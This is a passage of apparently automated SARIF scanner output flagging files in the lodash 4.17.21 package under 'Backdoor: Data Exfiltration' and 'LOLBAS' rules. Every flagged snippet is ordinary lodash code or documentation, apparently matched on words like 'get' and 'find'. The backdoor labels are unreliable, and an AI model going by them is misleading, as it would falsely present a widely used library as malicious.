                      "markdown": "`Fi(t)?Ni(no(n),t):function(r){var e=Mc(r,n);return e===X&&e===t?Nc(r,n):Se(t,e,hn|pn)}}function Ke(n,t,r,e,u){n!==t&&bs(t,function(i,o){if(u||(u=new wr),fc(i))Ve(n,t,o,r,Ke,e,u);else{var f=e?e(Ji(n,o),i,o+\"\",n,t,u):X;f===X&&(f=i),Er(n,o,f)}},qc)}function Ve(n,t,r,e,u,i,o){var f=Ji(n,r),c=Ji(t,r),a=o.get(c);if(a)return Er(n,r,a),X;var l=i?i(f,c,r+\"\",n,t,o):X,s=l===X;\nif(s){var h=bh(c),p=!h&&mh(c),_=!h&&!p&&Oh(c);l=c,h||p||_?bh(f)?l=f:Jf(f)?l=Tu(f):p?(s=!1,l=Iu(c,!0)):_?(s=!1,l=Wu(c,!0)):l=[]:gc(c)||dh(c)?(l=f,dh(f)?l=Rc(f):fc(f)&&!uc(f)||(l=Ei(c))):s=!1}s&&(o.set(c,l),u(l,c,e,i,o),o.delete(c)),Er(n,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 386,
                  "endLine": 32,
                  "endColumn": 391,
                  "snippet": {
                    "text": "e(n,u,i,o):e(n)),f!==X)return f;if(!fc(n))return n;var s=bh(n);if(s){if(f=zi(n),!c)return Tu(n,f)}else{var h=zs(n),p=h==Kn||h==Vn;if(mh(n))return Iu(n,c);if(h==Yn||h==Dn||p&&!i){if(f=a||p?{}:Ei(n),!c)return a?Mu(n,Ur(f,n)):Du(n,Cr(f,n))}else{if(!Vr[h])return i?n:{};f=Si(n,h,c)}}o||(o=new wr);var _=o.get(n);if(_)return _;o.set(n,f),kh(n)?n.forEach(function(r){f.add(Fr(r,t,e,r,n,o))}):jh(n)&&n.forEach(function(r,u){\nf.set(u,Fr(r,t,e,u,n,o))});var v=l?a?di:yi:a?qc:Pc,g=s?X:v(n);return r(g||n,function(r,u){g&&(u=r,r=n[u]),Sr(f,u,Fr(r,t,e,u,n,o))}),f}function Nr(n){var t=Pc(n);return function(r){return ",
                    "rendered": {
                      "text": "e(n,u,i,o):e(n)),f!==X)return f;if(!fc(n))return n;var s=bh(n);if(s){if(f=zi(n),!c)return Tu(n,f)}else{var h=zs(n),p=h==Kn||h==Vn;if(mh(n))return Iu(n,c);if(h==Yn||h==Dn||p&&!i){if(f=a||p?{}:Ei(n),!c)return a?Mu(n,Ur(f,n)):Du(n,Cr(f,n))}else{if(!Vr[h])return i?n:{};f=Si(n,h,c)}}o||(o=new wr);var _=o.get(n);if(_)return _;o.set(n,f),kh(n)?n.forEach(function(r){f.add(Fr(r,t,e,r,n,o))}):jh(n)&&n.forEach(function(r,u){\nf.set(u,Fr(r,t,e,u,n,o))});var v=l?a?di:yi:a?qc:Pc,g=s?X:v(n);return r(g||n,function(r,u){g&&(u=r,r=n[u]),Sr(f,u,Fr(r,t,e,u,n,o))}),f}function Nr(n){var t=Pc(n);return function(r){return ",
                      "markdown": "`e(n,u,i,o):e(n)),f!==X)return f;if(!fc(n))return n;var s=bh(n);if(s){if(f=zi(n),!c)return Tu(n,f)}else{var h=zs(n),p=h==Kn||h==Vn;if(mh(n))return Iu(n,c);if(h==Yn||h==Dn||p&&!i){if(f=a||p?{}:Ei(n),!c)return a?Mu(n,Ur(f,n)):Du(n,Cr(f,n))}else{if(!Vr[h])return i?n:{};f=Si(n,h,c)}}o||(o=new wr);var _=o.get(n);if(_)return _;o.set(n,f),kh(n)?n.forEach(function(r){f.add(Fr(r,t,e,r,n,o))}):jh(n)&&n.forEach(function(r,u){\nf.set(u,Fr(r,t,e,u,n,o))});var v=l?a?di:yi:a?qc:Pc,g=s?X:v(n);return r(g||n,function(r,u){g&&(u=r,r=n[u]),Sr(f,u,Fr(r,t,e,u,n,o))}),f}function Nr(n){var t=Pc(n);return function(r){return `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 241,
                  "endLine": 29,
                  "endColumn": 246,
                  "snippet": {
                    "text": " dr(n){return this.__data__.set(n,on),this}function br(n){\nreturn this.__data__.has(n)}function wr(n){this.size=(this.__data__=new ir(n)).size}function mr(){this.__data__=new ir,this.size=0}function xr(n){var t=this.__data__,r=t.delete(n);return this.size=t.size,r}function jr(n){return this.__data__.get(n)}function Ar(n){return this.__data__.has(n)}function kr(n,t){var r=this.__data__;if(r instanceof ir){var e=r.__data__;if(!ts||e.length<tn-1)return e.push([n,t]),this.size=++r.size,this;r=this.__data__=new sr(e)}return r.set(n,t),this.size=r.size,this}function Or(n,t){\nvar r=bh(n),e=!r&&dh(n),u=!r&",
                    "rendered": {
                      "text": " dr(n){return this.__data__.set(n,on),this}function br(n){\nreturn this.__data__.has(n)}function wr(n){this.size=(this.__data__=new ir(n)).size}function mr(){this.__data__=new ir,this.size=0}function xr(n){var t=this.__data__,r=t.delete(n);return this.size=t.size,r}function jr(n){return this.__data__.get(n)}function Ar(n){return this.__data__.has(n)}function kr(n,t){var r=this.__data__;if(r instanceof ir){var e=r.__data__;if(!ts||e.length<tn-1)return e.push([n,t]),this.size=++r.size,this;r=this.__data__=new sr(e)}return r.set(n,t),this.size=r.size,this}function Or(n,t){\nvar r=bh(n),e=!r&&dh(n),u=!r&",
                      "markdown": "` dr(n){return this.__data__.set(n,on),this}function br(n){\nreturn this.__data__.has(n)}function wr(n){this.size=(this.__data__=new ir(n)).size}function mr(){this.__data__=new ir,this.size=0}function xr(n){var t=this.__data__,r=t.delete(n);return this.size=t.size,r}function jr(n){return this.__data__.get(n)}function Ar(n){return this.__data__.has(n)}function kr(n,t){var r=this.__data__;if(r instanceof ir){var e=r.__data__;if(!ts||e.length<tn-1)return e.push([n,t]),this.size=++r.size,this;r=this.__data__=new sr(e)}return r.set(n,t),this.size=r.size,this}function Or(n,t){\nvar r=bh(n),e=!r&&dh(n),u=!r&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/lodash.min.js"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 216,
                  "endLine": 28,
                  "endColumn": 221,
                  "snippet": {
                    "text": "e][1]=t,this}function sr(n){var t=-1,r=null==n?0:n.length;for(this.clear();++t<r;){\nvar e=n[t];this.set(e[0],e[1])}}function hr(){this.size=0,this.__data__={hash:new Xt,map:new(ts||ir),string:new Xt}}function pr(n){var t=xi(this,n).delete(n);return this.size-=t?1:0,t}function _r(n){return xi(this,n).get(n)}function vr(n){return xi(this,n).has(n)}function gr(n,t){var r=xi(this,n),e=r.size;return r.set(n,t),this.size+=r.size==e?0:1,this}function yr(n){var t=-1,r=null==n?0:n.length;for(this.__data__=new sr;++t<r;)this.add(n[t])}function dr(n){return this.__data__.set(n,on),this}function br(n){\nreturn ",
                    "rendered": {
                      "text": "e][1]=t,this}function sr(n){var t=-1,r=null==n?0:n.length;for(this.clear();++t<r;){\nvar e=n[t];this.set(e[0],e[1])}}function hr(){this.size=0,this.__data__={hash:new Xt,map:new(ts||ir),string:new Xt}}function pr(n){var t=xi(this,n).delete(n);return this.size-=t?1:0,t}function _r(n){return xi(this,n).get(n)}function vr(n){return xi(this,n).has(n)}function gr(n,t){var r=xi(this,n),e=r.size;return r.set(n,t),this.size+=r.size==e?0:1,this}function yr(n){var t=-1,r=null==n?0:n.length;for(this.__data__=new sr;++t<r;)this.add(n[t])}function dr(n){return this.__data__.set(n,on),this}function br(n){\nreturn ",
                      "markdown": "`e][1]=t,this}function sr(n){var t=-1,r=null==n?0:n.length;for(this.clear();++t<r;){\nvar e=n[t];this.set(e[0],e[1])}}function hr(){this.size=0,this.__data__={hash:new Xt,map:new(ts||ir),string:new Xt}}function pr(n){var t=xi(this,n).delete(n);return this.size-=t?1:0,t}function _r(n){return xi(this,n).get(n)}function vr(n){return xi(this,n).has(n)}function gr(n,t){var r=xi(this,n),e=r.size;return r.set(n,t),this.size+=r.size==e?0:1,this}function yr(n){var t=-1,r=null==n?0:n.length;for(this.__data__=new sr;++t<r;)this.add(n[t])}function dr(n){return this.__data__.set(n,on),this}function br(n){\nreturn `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/at.js"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 3,
                  "endLine": 21,
                  "endColumn": 7,
                  "snippet": {
                    "text": " * _.at(object, ['a[0].b.c', 'a[1]']);\n * // => [3, 4]\n */\nvar at = flatRest(baseAt);\n\nmodule.exports = at;\n",
                    "rendered": {
                      "text": " * _.at(object, ['a[0].b.c', 'a[1]']);\n * // => [3, 4]\n */\nvar at = flatRest(baseAt);\n\nmodule.exports = at;\n",
                      "markdown": "` * _.at(object, ['a[0].b.c', 'a[1]']);\n * // => [3, 4]\n */\nvar at = flatRest(baseAt);\n\nmodule.exports = at;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/find.js"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 3,
                  "endLine": 40,
                  "endColumn": 9,
                  "snippet": {
                    "text": " * _.find(users, 'active');\n * // => object for 'barney'\n */\nvar find = createFind(findIndex);\n\nmodule.exports = find;\n",
                    "rendered": {
                      "text": " * _.find(users, 'active');\n * // => object for 'barney'\n */\nvar find = createFind(findIndex);\n\nmodule.exports = find;\n",
                      "markdown": "` * _.find(users, 'active');\n * // => object for 'barney'\n */\nvar find = createFind(findIndex);\n\nmodule.exports = find;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/_mapCacheGet.js"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 30,
                  "endLine": 13,
                  "endColumn": 35,
                  "snippet": {
                    "text": " * @returns {*} Returns the entry value.\n */\nfunction mapCacheGet(key) {\n  return getMapData(this, key).get(key);\n}\n\nmodule.exports = mapCacheGet;\n",
                    "rendered": {
                      "text": " * @returns {*} Returns the entry value.\n */\nfunction mapCacheGet(key) {\n  return getMapData(this, key).get(key);\n}\n\nmodule.exports = mapCacheGet;\n",
                      "markdown": "` * @returns {*} Returns the entry value.\n */\nfunction mapCacheGet(key) {\n  return getMapData(this, key).get(key);\n}\n\nmodule.exports = mapCacheGet;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.min.js"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 154,
                  "endLine": 28,
                  "endColumn": 160,
                  "snippet": {
                    "text": "),n.length)},o.some=function(n,t,r){return t=r?Z:t,E(n,g(t))},o.uniqueId=function(n){var t=++sn;return Q(n)+t},o.each=z,o.first=q,Y(o,function(){\nvar n={};return s(o,function(t,r){pn.call(o.prototype,r)||(n[r]=t)}),n}(),{chain:false}),o.VERSION=\"4.17.21\",mn(\"pop join replace reverse split push shift sort splice unshift\".split(\" \"),function(n){var t=(/^(?:replace|split)$/.test(n)?String.prototype:an)[n],r=/^(?:push|sort|unshift)$/.test(n)?\"tap\":\"thru\",e=/^(?:pop|join|replace|shift)$/.test(n);o.prototype[n]=function(){var n=arguments;if(e&&!this.__chain__){var u=this.value();return t.apply(Nn(u)?u:[],",
                    "rendered": {
                      "text": "),n.length)},o.some=function(n,t,r){return t=r?Z:t,E(n,g(t))},o.uniqueId=function(n){var t=++sn;return Q(n)+t},o.each=z,o.first=q,Y(o,function(){\nvar n={};return s(o,function(t,r){pn.call(o.prototype,r)||(n[r]=t)}),n}(),{chain:false}),o.VERSION=\"4.17.21\",mn(\"pop join replace reverse split push shift sort splice unshift\".split(\" \"),function(n){var t=(/^(?:replace|split)$/.test(n)?String.prototype:an)[n],r=/^(?:push|sort|unshift)$/.test(n)?\"tap\":\"thru\",e=/^(?:pop|join|replace|shift)$/.test(n);o.prototype[n]=function(){var n=arguments;if(e&&!this.__chain__){var u=this.value();return t.apply(Nn(u)?u:[],",
                      "markdown": "`),n.length)},o.some=function(n,t,r){return t=r?Z:t,E(n,g(t))},o.uniqueId=function(n){var t=++sn;return Q(n)+t},o.each=z,o.first=q,Y(o,function(){\nvar n={};return s(o,function(t,r){pn.call(o.prototype,r)||(n[r]=t)}),n}(),{chain:false}),o.VERSION=\"4.17.21\",mn(\"pop join replace reverse split push shift sort splice unshift\".split(\" \"),function(n){var t=(/^(?:replace|split)$/.test(n)?String.prototype:an)[n],r=/^(?:push|sort|unshift)$/.test(n)?\"tap\":\"thru\",e=/^(?:pop|join|replace|shift)$/.test(n);o.prototype[n]=function(){var n=arguments;if(e&&!this.__chain__){var u=this.value();return t.apply(Nn(u)?u:[],`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.min.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 19,
                  "endLine": 14,
                  "endColumn": 24,
                  "snippet": {
                    "text": "(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,c=Dn(n),f=c.length,a=Dn(t).length;if(f!=a&&!i)return false;for(a=f;a--;){var l=c[a];if(!(i?l in t:pn.call(t,l)))return false;\n}var p=o.get(n),l=o.get(t);if(p&&l)return p==t&&l==n;for(p=true;++a<f;){var l=c[a],s=n[l],h=t[l];if(void 0!==Z||s!==h&&!u(s,h,r,e,o)){p=false;break}i||(i=\"constructor\"==l)}return p&&!i&&(r=n.constructor,e=t.constructor,r!=e&&\"constructor\"in n&&\"constructor\"in t&&!(typeof r==\"function\"&&r instanceof r&&typeof e==\"function\"&",
                    "rendered": {
                      "text": "(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,c=Dn(n),f=c.length,a=Dn(t).length;if(f!=a&&!i)return false;for(a=f;a--;){var l=c[a];if(!(i?l in t:pn.call(t,l)))return false;\n}var p=o.get(n),l=o.get(t);if(p&&l)return p==t&&l==n;for(p=true;++a<f;){var l=c[a],s=n[l],h=t[l];if(void 0!==Z||s!==h&&!u(s,h,r,e,o)){p=false;break}i||(i=\"constructor\"==l)}return p&&!i&&(r=n.constructor,e=t.constructor,r!=e&&\"constructor\"in n&&\"constructor\"in t&&!(typeof r==\"function\"&&r instanceof r&&typeof e==\"function\"&",
                      "markdown": "`(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,c=Dn(n),f=c.length,a=Dn(t).length;if(f!=a&&!i)return false;for(a=f;a--;){var l=c[a];if(!(i?l in t:pn.call(t,l)))return false;\n}var p=o.get(n),l=o.get(t);if(p&&l)return p==t&&l==n;for(p=true;++a<f;){var l=c[a],s=n[l],h=t[l];if(void 0!==Z||s!==h&&!u(s,h,r,e,o)){p=false;break}i||(i=\"constructor\"==l)}return p&&!i&&(r=n.constructor,e=t.constructor,r!=e&&\"constructor\"in n&&\"constructor\"in t&&!(typeof r==\"function\"&&r instanceof r&&typeof e==\"function\"&`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.min.js"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 8,
                  "endLine": 14,
                  "endColumn": 13,
                  "snippet": {
                    "text": "ion(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,c=Dn(n),f=c.length,a=Dn(t).length;if(f!=a&&!i)return false;for(a=f;a--;){var l=c[a];if(!(i?l in t:pn.call(t,l)))return false;\n}var p=o.get(n),l=o.get(t);if(p&&l)return p==t&&l==n;for(p=true;++a<f;){var l=c[a],s=n[l],h=t[l];if(void 0!==Z||s!==h&&!u(s,h,r,e,o)){p=false;break}i||(i=\"constructor\"==l)}return p&&!i&&(r=n.constructor,e=t.constructor,r!=e&&\"constructor\"in n&&\"constructor\"in t&&!(typeof r==\"function\"&&r instanceof r&&typeof e==",
                    "rendered": {
                      "text": "ion(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,c=Dn(n),f=c.length,a=Dn(t).length;if(f!=a&&!i)return false;for(a=f;a--;){var l=c[a];if(!(i?l in t:pn.call(t,l)))return false;\n}var p=o.get(n),l=o.get(t);if(p&&l)return p==t&&l==n;for(p=true;++a<f;){var l=c[a],s=n[l],h=t[l];if(void 0!==Z||s!==h&&!u(s,h,r,e,o)){p=false;break}i||(i=\"constructor\"==l)}return p&&!i&&(r=n.constructor,e=t.constructor,r!=e&&\"constructor\"in n&&\"constructor\"in t&&!(typeof r==\"function\"&&r instanceof r&&typeof e==",
                      "markdown": "`ion(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,c=Dn(n),f=c.length,a=Dn(t).length;if(f!=a&&!i)return false;for(a=f;a--;){var l=c[a];if(!(i?l in t:pn.call(t,l)))return false;\n}var p=o.get(n),l=o.get(t);if(p&&l)return p==t&&l==n;for(p=true;++a<f;){var l=c[a],s=n[l],h=t[l];if(void 0!==Z||s!==h&&!u(s,h,r,e,o)){p=false;break}i||(i=\"constructor\"==l)}return p&&!i&&(r=n.constructor,e=t.constructor,r!=e&&\"constructor\"in n&&\"constructor\"in t&&!(typeof r==\"function\"&&r instanceof r&&typeof e==`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.min.js"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 122,
                  "endLine": 13,
                  "endColumn": 127,
                  "snippet": {
                    "text": "l=this&&this!==on&&this instanceof e?u:n;++c<f;)a[c]=r[c];for(;i--;)a[c++]=arguments[++o];return l.apply(t,a)}if(typeof n!=\"function\")throw new TypeError(\"Expected a function\");\nvar u=F(n);return e}function T(n,t,r,e,u,o){var i=n.length,c=t.length;if(i!=c&&!(1&r&&c>i))return false;var c=o.get(n),f=o.get(t);if(c&&f)return c==t&&f==n;for(var c=-1,f=true,a=2&r?[]:Z;++c<i;){var l=n[c],p=t[c];if(void 0!==Z){f=false;break}if(a){if(!E(t,function(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,",
                    "rendered": {
                      "text": "l=this&&this!==on&&this instanceof e?u:n;++c<f;)a[c]=r[c];for(;i--;)a[c++]=arguments[++o];return l.apply(t,a)}if(typeof n!=\"function\")throw new TypeError(\"Expected a function\");\nvar u=F(n);return e}function T(n,t,r,e,u,o){var i=n.length,c=t.length;if(i!=c&&!(1&r&&c>i))return false;var c=o.get(n),f=o.get(t);if(c&&f)return c==t&&f==n;for(var c=-1,f=true,a=2&r?[]:Z;++c<i;){var l=n[c],p=t[c];if(void 0!==Z){f=false;break}if(a){if(!E(t,function(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,",
                      "markdown": "`l=this&&this!==on&&this instanceof e?u:n;++c<f;)a[c]=r[c];for(;i--;)a[c++]=arguments[++o];return l.apply(t,a)}if(typeof n!=\"function\")throw new TypeError(\"Expected a function\");\nvar u=F(n);return e}function T(n,t,r,e,u,o){var i=n.length,c=t.length;if(i!=c&&!(1&r&&c>i))return false;var c=o.get(n),f=o.get(t);if(c&&f)return c==t&&f==n;for(var c=-1,f=true,a=2&r?[]:Z;++c<i;){var l=n[c],p=t[c];if(void 0!==Z){f=false;break}if(a){if(!E(t,function(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o){var i=1&r,`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/core.min.js"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 111,
                  "endLine": 13,
                  "endColumn": 116,
                  "snippet": {
                    "text": "Array(f+i),l=this&&this!==on&&this instanceof e?u:n;++c<f;)a[c]=r[c];for(;i--;)a[c++]=arguments[++o];return l.apply(t,a)}if(typeof n!=\"function\")throw new TypeError(\"Expected a function\");\nvar u=F(n);return e}function T(n,t,r,e,u,o){var i=n.length,c=t.length;if(i!=c&&!(1&r&&c>i))return false;var c=o.get(n),f=o.get(t);if(c&&f)return c==t&&f==n;for(var c=-1,f=true,a=2&r?[]:Z;++c<i;){var l=n[c],p=t[c];if(void 0!==Z){f=false;break}if(a){if(!E(t,function(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o)",
                    "rendered": {
                      "text": "Array(f+i),l=this&&this!==on&&this instanceof e?u:n;++c<f;)a[c]=r[c];for(;i--;)a[c++]=arguments[++o];return l.apply(t,a)}if(typeof n!=\"function\")throw new TypeError(\"Expected a function\");\nvar u=F(n);return e}function T(n,t,r,e,u,o){var i=n.length,c=t.length;if(i!=c&&!(1&r&&c>i))return false;var c=o.get(n),f=o.get(t);if(c&&f)return c==t&&f==n;for(var c=-1,f=true,a=2&r?[]:Z;++c<i;){var l=n[c],p=t[c];if(void 0!==Z){f=false;break}if(a){if(!E(t,function(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o)",
                      "markdown": "`Array(f+i),l=this&&this!==on&&this instanceof e?u:n;++c<f;)a[c]=r[c];for(;i--;)a[c++]=arguments[++o];return l.apply(t,a)}if(typeof n!=\"function\")throw new TypeError(\"Expected a function\");\nvar u=F(n);return e}function T(n,t,r,e,u,o){var i=n.length,c=t.length;if(i!=c&&!(1&r&&c>i))return false;var c=o.get(n),f=o.get(t);if(c&&f)return c==t&&f==n;for(var c=-1,f=true,a=2&r?[]:Z;++c<i;){var l=n[c],p=t[c];if(void 0!==Z){f=false;break}if(a){if(!E(t,function(n,t){if(!P(a,t)&&(l===n||u(l,n,r,e,o)))return a.push(t)})){f=false;break}}else if(l!==p&&!u(l,p,r,e,o)){f=false;break}}return f}function B(n,t,r,e,u,o)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/get.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 4,
                  "endLine": 25,
                  "endColumn": 9,
                  "snippet": {
                    "text": " * _.get(object, ['a', '0', 'b', 'c']);\n * // => 3\n *\n * _.get(object, 'a.b.c', 'default');\n * // => 'default'\n */\nfunction get(object, path, defaultValue) {\n",
                    "rendered": {
                      "text": " * _.get(object, ['a', '0', 'b', 'c']);\n * // => 3\n *\n * _.get(object, 'a.b.c', 'default');\n * // => 'default'\n */\nfunction get(object, path, defaultValue) {\n",
                      "markdown": "` * _.get(object, ['a', '0', 'b', 'c']);\n * // => 3\n *\n * _.get(object, 'a.b.c', 'default');\n * // => 'default'\n */\nfunction get(object, path, defaultValue) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/get.js"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 4,
                  "endLine": 22,
                  "endColumn": 9,
                  "snippet": {
                    "text": " * _.get(object, 'a[0].b.c');\n * // => 3\n *\n * _.get(object, ['a', '0', 'b', 'c']);\n * // => 3\n *\n * _.get(object, 'a.b.c', 'default');\n",
                    "rendered": {
                      "text": " * _.get(object, 'a[0].b.c');\n * // => 3\n *\n * _.get(object, ['a', '0', 'b', 'c']);\n * // => 3\n *\n * _.get(object, 'a.b.c', 'default');\n",
                      "markdown": "` * _.get(object, 'a[0].b.c');\n * // => 3\n *\n * _.get(object, ['a', '0', 'b', 'c']);\n * // => 3\n *\n * _.get(object, 'a.b.c', 'default');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/lodash.zip/package/get.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 4,
                  "endLine": 19,
                  "endColumn": 9,
                  "snippet": {
                    "text": " *\n * var object = { 'a': [{ 'b': { 'c': 3 } }] };\n *\n * _.get(object, 'a[0].b.c');\n * // => 3\n *\n * _.get(object, ['a', '0', 'b', 'c']);\n",
                    "rendered": {
